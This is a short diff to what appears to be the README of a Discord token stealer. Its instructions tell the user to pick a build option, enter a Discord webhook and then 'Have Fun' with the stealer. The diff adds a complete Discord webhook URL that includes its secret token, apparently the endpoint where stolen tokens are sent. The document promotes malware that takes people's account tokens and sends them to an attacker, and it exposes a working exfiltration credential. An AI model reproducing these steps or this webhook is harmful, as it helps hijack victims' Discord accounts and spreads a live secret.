@@ -18,3 +18,5 @@ choose build
 Now you need write ur discord webhook (ig u know how) he just ask  you like: Webhook:
 Now u are have Discrord token stealer!
 Have Fun!
+
+https://discord.com/api/webhooks/1440371849019265164/TCoIHxiZcVVHF8_acIWNYsRfUD-WwGDj50euGSXRlz3vLWBQTUJ6htgGUk43jmN4JRt0
